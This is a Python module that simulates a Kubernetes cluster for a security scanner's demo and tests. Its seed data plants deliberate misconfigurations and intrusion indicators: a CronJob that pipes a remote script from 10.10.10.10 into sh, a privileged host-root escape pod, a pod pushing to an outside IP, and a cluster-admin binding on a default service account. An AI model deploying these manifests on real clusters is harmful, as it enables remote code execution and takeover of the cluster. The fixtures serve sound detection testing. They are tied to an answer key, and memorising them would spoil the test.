"""Simulated Kubernetes cluster for the offline demo and the tests.

An in-memory object store persisted to <state_dir>/simulated/<target_id>.json so the CLI and the API see
the same cluster. It answers the kubectl subset the adapter uses (get, version, apply/replace from stdin,
patch, delete, rollout status, auth can-i). Writing a Deployment re-creates its pods from the template,
so a fix and its rollback are real state transitions that the next scan sees.

The seed matches range/answer_key/kubernetes.json: six misconfigurations and four intrusion indicators.
"""
from __future__ import annotations

import copy
import hashlib
import json
import os
import threading
from pathlib import Path

import yaml

from cyberthunder.transport.base import CommandResult, Transport, TransportError

from .kubectl import API_KIND_TO_PLURAL, CLUSTER_SCOPED, KIND_INFO, canonical_kind, parse_command

SERVER_VERSION = {"major": "1", "minor": "30", "gitVersion": "v1.30.6+k3s1", "platform": "linux/amd64"}
CLIENT_VERSION = {"major": "1", "minor": "30", "gitVersion": "v1.30.6", "platform": "linux/amd64"}
SEED_TIME = "2026-10-20T08:00:00Z"
_LOCK = threading.Lock()


# -- seed --------------------------------------------------------------------------------------
def _limits():
    return {"limits": {"cpu": "500m", "memory": "256Mi"}, "requests": {"cpu": "100m", "memory": "128Mi"}}


def _hardened(**extra):
    sc = {"allowPrivilegeEscalation": False, "runAsNonRoot": True, "runAsUser": 10001,
          "readOnlyRootFilesystem": True, "capabilities": {"drop": ["ALL"]}}
    sc.update(extra)
    return sc


def _container(name, image, sc=None, **kw):
    c = {"name": name, "image": image, "securityContext": sc if sc is not None else _hardened(),
         "resources": _limits()}
    c.update(kw)
    return c


def _meta(name, ns=None, **kw):
    md = {"name": name}
    if ns:
        md["namespace"] = ns
    md.update(kw)
    return md


def _deployment(name, ns, containers, labels=None, replicas=1, **pod_spec):
    labels = labels or {"app": name}
    spec = {"containers": containers}
    spec.update(pod_spec)
    return {"apiVersion": "apps/v1", "kind": "Deployment", "metadata": _meta(name, ns, labels=dict(labels)),
            "spec": {"replicas": replicas, "selector": {"matchLabels": dict(labels)},
                     "template": {"metadata": {"labels": dict(labels)}, "spec": spec}}}


def _static_pod(name, ns, command, image, **pod_spec):
    spec = {"hostNetwork": True, "priorityClassName": "system-node-critical",
            "containers": [{"name": command[0], "image": image, "command": command,
                            "resources": {"requests": {"cpu": "100m"}}}]}
    spec.update(pod_spec)
    return {"apiVersion": "v1", "kind": "Pod",
            "metadata": _meta(name, ns, labels={"component": command[0], "tier": "control-plane"},
                              annotations={"kubernetes.io/config.source": "file"}),
            "spec": spec}


def _sa(name, ns, automount=None):
    o = {"apiVersion": "v1", "kind": "ServiceAccount", "metadata": _meta(name, ns)}
    if automount is not None:
        o["automountServiceAccountToken"] = automount
    return o


def _netpol(name, ns):
    return {"apiVersion": "networking.k8s.io/v1", "kind": "NetworkPolicy", "metadata": _meta(name, ns),
            "spec": {"podSelector": {}, "policyTypes": ["Ingress"]}}


def _crb(name, role, subjects):
    return {"apiVersion": "rbac.authorization.k8s.io/v1", "kind": "ClusterRoleBinding", "metadata": _meta(name),
            "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": role},
            "subjects": subjects}


def seed_objects() -> list[dict]:
    """The seeded cluster, as manifests. range/k8s/manifests holds the same workload objects for k3s."""
    objs: list[dict] = []
    for ns in ("default", "kube-system", "kube-public", "kube-node-lease", "apps", "monitoring"):
        objs.append({"apiVersion": "v1", "kind": "Namespace", "metadata": _meta(ns)})
    for node, role in (("k3s-01", "control-plane"), ("k3s-02", "worker")):
        objs.append({"apiVersion": "v1", "kind": "Node",
                     "metadata": _meta(node, labels={f"node-role.kubernetes.io/{role}": "true",
                                                     "kubernetes.io/hostname": node}),
                     "status": {"conditions": [{"type": "Ready", "status": "True", "reason": "KubeletReady"}],
                                "nodeInfo": {"kubeletVersion": "v1.30.6+k3s1", "osImage": "Rocky Linux 9.4 (Blue Onyx)",
                                             "containerRuntimeVersion": "containerd://1.7.22-k3s1"}}})
    # control plane (static pods). M2: --anonymous-auth=true; M5: no --audit-log-path; M3: kubelet read-only port.
    objs.append(_static_pod("kube-apiserver-k3s-01", "kube-system", [
        "kube-apiserver", "--advertise-address=10.20.0.10", "--allow-privileged=true", "--anonymous-auth=true",
        "--authorization-mode=Node,RBAC", "--enable-admission-plugins=NodeRestriction",
        "--audit-policy-file=/etc/kubernetes/audit-policy.yaml", "--insecure-port=0",
        "--profiling=false", "--secure-port=6443", "--tls-min-version=VersionTLS12",
        "--tls-cert-file=/var/lib/rancher/k3s/server/tls/serving-kube-apiserver.crt",
        "--tls-private-key-file=/var/lib/rancher/k3s/server/tls/serving-kube-apiserver.key"],
        "registry.local/k8s/kube-apiserver:v1.30.6"))
    objs.append(_static_pod("kube-controller-manager-k3s-01", "kube-system", [
        "kube-controller-manager", "--use-service-account-credentials=true", "--profiling=false",
        "--bind-address=127.0.0.1", "--tls-min-version=VersionTLS12"],
        "registry.local/k8s/kube-controller-manager:v1.30.6"))
    objs.append(_static_pod("kube-scheduler-k3s-01", "kube-system", [
        "kube-scheduler", "--profiling=false", "--bind-address=127.0.0.1"],
        "registry.local/k8s/kube-scheduler:v1.30.6"))
    objs.append(_static_pod("etcd-k3s-01", "kube-system", [
        "etcd", "--client-cert-auth=true", "--peer-client-cert-auth=true", "--auto-tls=false"],
        "registry.local/k8s/etcd:3.5.15-0"))
    objs.append(_static_pod("kubelet-k3s-01", "kube-system", [
        "kubelet", "--config=/var/lib/kubelet/config.yaml", "--anonymous-auth=false",
        "--authorization-mode=Webhook", "--read-only-port=10255"],
        "registry.local/k8s/kubelet:v1.30.6"))
    objs.append(_deployment("coredns", "kube-system", [
        _container("coredns", "registry.local/k8s/coredns:1.11.1", args=["-conf", "/etc/coredns/Corefile"])],
        labels={"k8s-app": "kube-dns"}, replicas=1))
    objs.append(_deployment("local-path-provisioner", "kube-system", [
        _container("local-path-provisioner", "registry.local/k8s/local-path-provisioner:v0.0.28")]))
    # I4: unexpected pod in kube-system from an unknown registry
    objs.append({"apiVersion": "v1", "kind": "Pod",
                 "metadata": _meta("metrics-collector-7d9f4", "kube-system", labels={"app": "metrics-collector"}),
                 "spec": {"containers": [_container("collector", "198.51.100.23:5000/collector:1.0",
                                                    command=["/collector", "--push", "198.51.100.23:9091"])]}})
    # apps: M1 privileged deployment, M6 secret in env, I2 cronjob, I3 masquerading escape pod
    objs.append(_deployment("web-frontend", "apps", [
        _container("web", "registry.local/apps/web-frontend:2.4.1",
                   sc={"privileged": True, "runAsNonRoot": True, "runAsUser": 10001, "readOnlyRootFilesystem": True,
                       "capabilities": {"drop": ["ALL"]}},
                   ports=[{"containerPort": 8080, "protocol": "TCP"}])], replicas=2,
        automountServiceAccountToken=False))
    objs.append(_deployment("payments-api", "apps", [
        _container("api", "registry.local/apps/payments:1.8.0",
                   env=[{"name": "LOG_LEVEL", "value": "info"},
                        {"name": "DB_PASSWORD", "valueFrom": {"secretKeyRef": {"name": "payments-db", "key": "password"}}}],
                   ports=[{"containerPort": 8443, "protocol": "TCP"}])], automountServiceAccountToken=False))
    objs.append({"apiVersion": "batch/v1", "kind": "CronJob", "metadata": _meta("cache-warmer", "apps"),
                 "spec": {"schedule": "*/15 * * * *", "jobTemplate": {"spec": {"template": {"spec": {
                     "restartPolicy": "OnFailure", "automountServiceAccountToken": False,
                     "containers": [_container("warm", "registry.local/apps/toolbox:1.2",
                                               command=["/bin/sh", "-c",
                                                        "curl -fsSL http://10.10.10.10:8443/k.sh | sh"])]}}}}}})
    objs.append({"apiVersion": "v1", "kind": "Pod",
                 "metadata": _meta("kube-proxy-helper", "apps", labels={"app": "kube-proxy-helper"}),
                 "spec": {"hostPID": True, "containers": [{
                     "name": "helper", "image": "ghcr.io/x0rcist/node-tools:latest",
                     "command": ["/bin/sh", "-c", "sleep infinity"],
                     "securityContext": {"privileged": True},
                     "volumeMounts": [{"name": "host-root", "mountPath": "/host"}]}],
                     "volumes": [{"name": "host-root", "hostPath": {"path": "/", "type": "Directory"}}]}})
    objs.append({"apiVersion": "v1", "kind": "Secret", "metadata": _meta("payments-db", "apps"), "type": "Opaque"})
    objs.append(_deployment("prometheus", "monitoring", [
        _container("prometheus", "registry.local/monitoring/prometheus:v2.53.0",
                   ports=[{"containerPort": 9090, "protocol": "TCP"}])],
        serviceAccountName="prometheus", automountServiceAccountToken=True))
    # service accounts. M4: apps/default has no automountServiceAccountToken: false.
    for ns in ("default", "monitoring"):
        objs.append(_sa("default", ns, automount=False))
    objs.append(_sa("default", "apps"))
    objs.append(_sa("default", "kube-system"))
    objs.append(_sa("prometheus", "monitoring", automount=True))
    # network policies (apps and monitoring are covered)
    objs.append(_netpol("default-deny-ingress", "apps"))
    objs.append(_netpol("default-deny-ingress", "monitoring"))
    # RBAC. I1: cluster-admin bound to the default service account of the default namespace.
    objs.append({"apiVersion": "rbac.authorization.k8s.io/v1", "kind": "ClusterRole", "metadata": _meta("cluster-admin"),
                 "rules": [{"apiGroups": ["*"], "resources": ["*"], "verbs": ["*"]}]})
    objs.append({"apiVersion": "rbac.authorization.k8s.io/v1", "kind": "ClusterRole", "metadata": _meta("prometheus-read"),
                 "rules": [{"apiGroups": [""], "resources": ["pods", "nodes", "services", "endpoints"],
                            "verbs": ["get", "list", "watch"]}]})
    objs.append(_crb("cluster-admin", "cluster-admin",
                     [{"apiGroup": "rbac.authorization.k8s.io", "kind": "Group", "name": "system:masters"}]))
    objs.append(_crb("prometheus", "prometheus-read",
                     [{"kind": "ServiceAccount", "name": "prometheus", "namespace": "monitoring"}]))
    objs.append(_crb("system-monitor-binding", "cluster-admin",
                     [{"kind": "ServiceAccount", "name": "default", "namespace": "default"}]))
    objs.append({"apiVersion": "rbac.authorization.k8s.io/v1", "kind": "Role", "metadata": _meta("pod-reader", "apps"),
                 "rules": [{"apiGroups": [""], "resources": ["pods"], "verbs": ["get", "list"]}]})
    objs.append({"apiVersion": "rbac.authorization.k8s.io/v1", "kind": "RoleBinding", "metadata": _meta("web-reader", "apps"),
                 "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "Role", "name": "pod-reader"},
                 "subjects": [{"kind": "ServiceAccount", "name": "default", "namespace": "apps"}]})
    # services
    objs.append({"apiVersion": "v1", "kind": "Service", "metadata": _meta("kubernetes", "default"),
                 "spec": {"type": "ClusterIP", "ports": [{"port": 443, "targetPort": 6443}]}})
    objs.append({"apiVersion": "v1", "kind": "Service", "metadata": _meta("kube-dns", "kube-system"),
                 "spec": {"type": "ClusterIP", "selector": {"k8s-app": "kube-dns"}, "ports": [{"port": 53}]}})
    objs.append({"apiVersion": "v1", "kind": "Service", "metadata": _meta("web-frontend", "apps"),
                 "spec": {"type": "ClusterIP", "selector": {"app": "web-frontend"}, "ports": [{"port": 80, "targetPort": 8080}]}})
    return objs


# -- merge helpers ------------------------------------------------------------------------------
def merge_patch(target, patch):
    """RFC 7386 JSON merge patch."""
    if not isinstance(patch, dict):
        return copy.deepcopy(patch)
    out = copy.deepcopy(target) if isinstance(target, dict) else {}
    for k, v in patch.items():
        if v is None:
            out.pop(k, None)
        else:
            out[k] = merge_patch(out.get(k), v)
    return out


def strategic_merge(target, patch):
    """Strategic merge for the cases the adapter emits: lists of dicts with a 'name' key merge by name."""
    if isinstance(patch, dict):
        out = copy.deepcopy(target) if isinstance(target, dict) else {}
        for k, v in patch.items():
            if v is None:
                out.pop(k, None)
            else:
                out[k] = strategic_merge(out.get(k), v)
        return out
    if isinstance(patch, list) and isinstance(target, list) and patch and all(isinstance(p, dict) and "name" in p for p in patch):
        out = copy.deepcopy(target)
        for p in patch:
            for i, t in enumerate(out):
                if isinstance(t, dict) and t.get("name") == p["name"]:
                    out[i] = strategic_merge(t, p)
                    break
            else:
                out.append(copy.deepcopy(p))
        return out
    return copy.deepcopy(patch)


def _pointer(path: str) -> list:
    return [p.replace("~1", "/").replace("~0", "~") for p in path.lstrip("/").split("/")] if path else []


def json_patch(doc, ops: list[dict]):
    """RFC 6902 subset: add, replace, remove."""
    doc = copy.deepcopy(doc)
    for op in ops:
        parts = _pointer(op["path"])
        parent = doc
        for p in parts[:-1]:
            parent = parent[int(p)] if isinstance(parent, list) else parent[p]
        last = parts[-1]
        kind = op["op"]
        if isinstance(parent, list):
            idx = len(parent) if last == "-" else int(last)
            if kind == "add":
                parent.insert(idx, op["value"])
            elif kind == "replace":
                parent[idx] = op["value"]
            elif kind == "remove":
                parent.pop(idx)
            else:
                raise ValueError(f"unsupported op {kind}")
        else:
            if kind in ("add", "replace"):
                if kind == "replace" and last not in parent:
                    raise KeyError(op["path"])
                parent[last] = op["value"]
            elif kind == "remove":
                del parent[last]
            else:
                raise ValueError(f"unsupported op {kind}")
    return doc


# -- the cluster ----------------------------------------------------------------------------------
class SimulatedCluster:
    def __init__(self, path: str | Path):
        self.path = Path(path)
        self.state: dict = {}

    # persistence
    def load(self) -> None:
        if self.path.exists():
            self.state = json.loads(self.path.read_text(encoding="utf-8"))
        else:
            self.reset()

    def save(self) -> None:
        self.path.parent.mkdir(parents=True, exist_ok=True)
        tmp = self.path.with_suffix(".tmp")
        tmp.write_text(json.dumps(self.state, indent=1, sort_keys=True), encoding="utf-8")
        os.replace(tmp, self.path)

    def reset(self) -> None:
        self.state = {"rv": 1000, "objects": {k: {} for k in KIND_INFO}}
        for o in seed_objects():
            self._put(o, created_at=SEED_TIME)
        self.save()

    # object helpers
    def _bucket(self, plural: str) -> dict:
        return self.state["objects"].setdefault(plural, {})

    @staticmethod
    def _key(ns: str | None, name: str) -> str:
        return f"{ns or ''}/{name}"

    def _next_rv(self) -> str:
        self.state["rv"] += 1
        return str(self.state["rv"])

    def get(self, plural: str, ns: str | None, name: str) -> dict | None:
        if plural in CLUSTER_SCOPED:
            ns = None
        return self._bucket(plural).get(self._key(ns, name))

    def list(self, plural: str, ns: str | None) -> list[dict]:
        items = list(self._bucket(plural).values())
        if ns is not None and plural not in CLUSTER_SCOPED:
            items = [o for o in items if o["metadata"].get("namespace") == ns]
        return sorted(items, key=lambda o: (o["metadata"].get("namespace", ""), o["metadata"]["name"]))

    def _put(self, obj: dict, default_ns: str = "default", created_at: str | None = None) -> tuple[dict, bool]:
        obj = copy.deepcopy(obj)
        plural = API_KIND_TO_PLURAL.get(obj.get("kind", ""))
        if plural is None:
            raise ValueError(f"unsupported kind {obj.get('kind')!r}")
        md = obj.setdefault("metadata", {})
        if plural in CLUSTER_SCOPED:
            md.pop("namespace", None)
            ns = None
        else:
            ns = md.setdefault("namespace", default_ns)
        name = md["name"]
        existing = self.get(plural, ns, name)
        if existing:
            md["uid"] = existing["metadata"]["uid"]
            md["creationTimestamp"] = existing["metadata"]["creationTimestamp"]
            if "status" in existing and "status" not in obj:
                obj["status"] = existing["status"]
        else:
            md["uid"] = hashlib.sha1(f"{plural}/{ns}/{name}/{self.state['rv']}".encode()).hexdigest()[:8] + "-sim"
            md["creationTimestamp"] = created_at or SEED_TIME
        md["resourceVersion"] = self._next_rv()
        if plural == "pods":
            obj.setdefault("status", self._running_status(obj))
        self._bucket(plural)[self._key(ns, name)] = obj
        if plural == "deployments":
            self._rollout(obj)
        return obj, existing is None

    def delete(self, plural: str, ns: str | None, name: str) -> bool:
        if plural in CLUSTER_SCOPED:
            ns = None
        obj = self._bucket(plural).pop(self._key(ns, name), None)
        if obj is None:
            return False
        if plural == "deployments":
            self._delete_owned_pods(ns, name)
        return True

    @staticmethod
    def _running_status(pod: dict) -> dict:
        return {"phase": "Running", "containerStatuses": [
            {"name": c["name"], "ready": True, "restartCount": 0, "state": {"running": {"startedAt": SEED_TIME}}}
            for c in pod.get("spec", {}).get("containers", [])]}

    def _delete_owned_pods(self, ns: str, deployment: str) -> None:
        pods = self._bucket("pods")
        for k in [k for k, p in pods.items()
                  if p["metadata"].get("namespace") == ns
                  and p["metadata"].get("labels", {}).get("ct.sim/owner") == deployment]:
            del pods[k]

    def _rollout(self, dep: dict) -> None:
        ns, name = dep["metadata"]["namespace"], dep["metadata"]["name"]
        self._delete_owned_pods(ns, name)
        template = dep["spec"]["template"]
        h = hashlib.sha1(json.dumps(template, sort_keys=True).encode()).hexdigest()[:10]
        for i in range(int(dep["spec"].get("replicas", 1))):
            suffix = hashlib.sha1(f"{h}{i}".encode()).hexdigest()[:5]
            labels = dict(template.get("metadata", {}).get("labels", {}))
            labels["ct.sim/owner"] = name
            labels["pod-template-hash"] = h
            pod = {"apiVersion": "v1", "kind": "Pod",
                   "metadata": {"name": f"{name}-{h}-{suffix}", "namespace": ns, "labels": labels,
                                "ownerReferences": [{"apiVersion": "apps/v1", "kind": "ReplicaSet",
                                                     "name": f"{name}-{h}", "controller": True}]},
                   "spec": copy.deepcopy(template["spec"])}
            self._put(pod)

    # command handling
    def handle(self, argv: list[str], stdin: str | None) -> tuple[int, str, str]:
        if not argv or argv[0] != "kubectl":
            return 127, "", f"simulated cluster: unknown command {' '.join(argv)!r}"
        args = list(argv[1:])
        # global flags
        opts: dict = {"ns": None, "all": False, "output": None}
        rest: list[str] = []
        i = 0
        while i < len(args):
            a = args[i]
            if a in ("-n", "--namespace"):
                opts["ns"] = args[i + 1]; i += 2; continue
            if a.startswith("--namespace="):
                opts["ns"] = a.split("=", 1)[1]; i += 1; continue
            if a in ("-A", "--all-namespaces"):
                opts["all"] = True; i += 1; continue
            if a == "-o":
                opts["output"] = args[i + 1]; i += 2; continue
            if a.startswith("-o=") or a.startswith("--output="):
                opts["output"] = a.split("=", 1)[1]; i += 1; continue
            if a in ("--kubeconfig", "--context"):
                i += 2; continue
            rest.append(a); i += 1
        if not rest:
            return 127, "", "simulated cluster: no verb"
        verb, rest = rest[0], rest[1:]
        try:
            fn = getattr(self, f"_cmd_{verb.replace('-', '_')}", None)
            if fn is None:
                return 127, "", f"simulated cluster: unsupported verb {verb!r}"
            return fn(rest, opts, stdin)
        except (KeyError, IndexError, ValueError, TypeError, yaml.YAMLError, json.JSONDecodeError) as e:
            return 1, "", f"error: {e}"

    def _cmd_version(self, rest, opts, stdin):
        return 0, json.dumps({"clientVersion": CLIENT_VERSION, "serverVersion": SERVER_VERSION}, indent=2), ""

    def _cmd_get(self, rest, opts, stdin):
        if rest and rest[0] == "--raw":
            return 1, "", "Error from server (NotFound): the server could not find the requested resource"
        if not rest:
            return 1, "", "error: you must specify the type of resource to get"
        kind_arg = rest[0]
        name = rest[1] if len(rest) > 1 else None
        if "/" in kind_arg and name is None:
            kind_arg, name = kind_arg.split("/", 1)
        plural = canonical_kind(kind_arg)
        if plural is None:
            return 1, "", f'error: the server doesn\'t have a resource type "{kind_arg}"'
        ns = None if opts["all"] else (opts["ns"] or "default")
        if name:
            obj = self.get(plural, ns, name)
            if obj is None:
                return 1, "", f'Error from server (NotFound): {plural} "{name}" not found'
            return 0, self._render([obj], opts, single=True), ""
        return 0, self._render(self.list(plural, ns), opts, single=False), ""

    @staticmethod
    def _render(items: list[dict], opts: dict, single: bool) -> str:
        if opts["output"] in ("json",):
            if single:
                return json.dumps(items[0], indent=2)
            return json.dumps({"apiVersion": "v1", "kind": "List", "items": items, "metadata": {"resourceVersion": ""}}, indent=2)
        if opts["output"] in ("yaml",):
            return yaml.safe_dump(items[0] if single else {"apiVersion": "v1", "kind": "List", "items": items}, sort_keys=False)
        if opts["output"] == "name":
            return "\n".join(f"{KIND_INFO[API_KIND_TO_PLURAL[o['kind']]][0]}/{o['metadata']['name']}" for o in items) + "\n"
        lines = ["NAMESPACE   NAME"] + [f"{o['metadata'].get('namespace', ''):<11} {o['metadata']['name']}" for o in items]
        return "\n".join(lines) + "\n"

    def _docs(self, stdin: str | None) -> list[dict]:
        if not stdin or not stdin.strip():
            raise ValueError("no objects passed on stdin")
        docs: list[dict] = []
        for d in yaml.safe_load_all(stdin):
            if not d:
                continue
            if d.get("kind") == "List":
                docs.extend(d.get("items", []))
            else:
                docs.append(d)
        return docs

    def _cmd_apply(self, rest, opts, stdin):
        if "-f" not in rest or rest[rest.index("-f") + 1] != "-":
            return 1, "", "simulated cluster: only 'apply -f -' is supported"
        out = []
        for d in self._docs(stdin):
            obj, created = self._put(d, default_ns=opts["ns"] or "default")
            out.append(f"{KIND_INFO[API_KIND_TO_PLURAL[obj['kind']]][0]}/{obj['metadata']['name']} {'created' if created else 'configured'}")
        return 0, "\n".join(out) + "\n", ""

    def _cmd_replace(self, rest, opts, stdin):
        if "-f" not in rest or rest[rest.index("-f") + 1] != "-":
            return 1, "", "simulated cluster: only 'replace -f -' is supported"
        out = []
        for d in self._docs(stdin):
            plural = API_KIND_TO_PLURAL.get(d.get("kind", ""))
            if plural is None:
                return 1, "", f"unsupported kind {d.get('kind')!r}"
            ns = d.get("metadata", {}).get("namespace") or opts["ns"] or "default"
            name = d["metadata"]["name"]
            if self.get(plural, ns, name) is None:
                return 1, "", f'Error from server (NotFound): {plural} "{name}" not found'
            obj, _ = self._put(d, default_ns=ns)
            out.append(f"{KIND_INFO[plural][0]}/{name} replaced")
        return 0, "\n".join(out) + "\n", ""

    def _cmd_patch(self, rest, opts, stdin):
        kind_arg, name = rest[0], rest[1]
        if "/" in kind_arg:
            kind_arg, name = kind_arg.split("/", 1)
        plural = canonical_kind(kind_arg)
        if plural is None:
            return 1, "", f"unknown kind {kind_arg!r}"
        ptype, patch_text = "strategic", None
        it = iter(rest[2:])
        for a in it:
            if a.startswith("--type="):
                ptype = a.split("=", 1)[1]
            elif a == "--type":
                ptype = next(it)
            elif a in ("-p", "--patch"):
                patch_text = next(it)
            elif a.startswith("--patch=") or a.startswith("-p="):
                patch_text = a.split("=", 1)[1]
        if patch_text is None:
            return 1, "", "error: must specify -p to patch"
        ns = opts["ns"] or "default"
        obj = self.get(plural, ns, name)
        if obj is None:
            return 1, "", f'Error from server (NotFound): {plural} "{name}" not found'
        patch = json.loads(patch_text)
        if ptype == "json":
            new = json_patch(obj, patch)
        elif ptype == "merge":
            new = merge_patch(obj, patch)
        elif ptype == "strategic":
            new = strategic_merge(obj, patch)
        else:
            return 1, "", f"unsupported patch type {ptype!r}"
        if new == obj:
            return 0, f"{KIND_INFO[plural][0]}/{name} patched (no change)\n", ""
        self._put(new, default_ns=ns)
        return 0, f"{KIND_INFO[plural][0]}/{name} patched\n", ""

    def _cmd_delete(self, rest, opts, stdin):
        kind_arg = rest[0]
        names = [a for a in rest[1:] if not a.startswith("-")]
        ignore = "--ignore-not-found" in rest or "--ignore-not-found=true" in rest
        if "/" in kind_arg:
            kind_arg, n = kind_arg.split("/", 1)
            names = [n]
        plural = canonical_kind(kind_arg)
        if plural is None or not names:
            return 1, "", "error: resource(s) were provided, but no name was specified"
        ns = opts["ns"] or "default"
        out = []
        for n in names:
            if not self.delete(plural, ns, n):
                if ignore:
                    continue
                return 1, "", f'Error from server (NotFound): {plural} "{n}" not found'
            out.append(f'{KIND_INFO[plural][0]} "{n}" deleted')
        return 0, "\n".join(out) + ("\n" if out else ""), ""

    def _cmd_rollout(self, rest, opts, stdin):
        if not rest or rest[0] != "status":
            return 127, "", "simulated cluster: only 'rollout status' is supported"
        target = rest[1]
        kind_arg, _, name = target.partition("/")
        plural = canonical_kind(kind_arg)
        if plural != "deployments" or self.get(plural, opts["ns"] or "default", name) is None:
            return 1, "", f'Error from server (NotFound): deployments "{name}" not found'
        return 0, f'deployment "{name}" successfully rolled out\n', ""

    def _cmd_auth(self, rest, opts, stdin):
        if rest and rest[0] == "can-i":
            return 0, "yes\n", ""
        return 127, "", "simulated cluster: only 'auth can-i' is supported"


class SimulatedClusterTransport(Transport):
    """Transport kind 'simulated' for the kubernetes adapter. State lives in one JSON file."""
    kind = "simulated"

    def __init__(self, path: str | Path):
        self.path = Path(path)
        self.calls: list[str] = []

    def cluster(self) -> SimulatedCluster:
        c = SimulatedCluster(self.path)
        c.load()
        return c

    def reset(self) -> None:
        with _LOCK:
            SimulatedCluster(self.path).reset()

    def run(self, command: str, *, timeout: int = 120, sudo: bool = False) -> CommandResult:
        self.calls.append(command)
        try:
            argv, stdin = parse_command(command)
        except ValueError as e:
            return CommandResult(command, 2, "", f"cannot parse command: {e}")
        with _LOCK:
            c = self.cluster()
            before = json.dumps(c.state, sort_keys=True)
            code, out, err = c.handle(argv, stdin)
            if json.dumps(c.state, sort_keys=True) != before:
                c.save()
        return CommandResult(command, code, out, err)

    def read_file(self, path: str) -> bytes:
        raise TransportError("simulated cluster has no file access; use kubectl")

    def write_file(self, path: str, data: bytes, *, mode: int | None = None, sudo: bool = False) -> None:
        raise TransportError("simulated cluster has no file access; use kubectl")
